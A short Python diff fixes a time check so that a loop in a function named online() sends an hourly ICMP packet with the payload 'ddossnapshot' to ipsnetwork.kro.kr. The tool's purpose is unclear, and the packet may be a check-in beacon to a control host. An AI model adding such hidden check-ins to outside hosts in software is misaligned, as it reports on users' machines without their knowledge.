@@ -27,7 +27,7 @@ def check_error():
 
 def online():
     while(1):
-        if(time.strftime('%M', time.localtime(time.time())) == 0):
+        if(time.strftime('%M', time.localtime(time.time())) == '00'):
             send(IP(dst="ipsnetwork.kro.kr") / ICMP() / 'ddossnapshot', verbose=False)
         time.sleep(40)
 
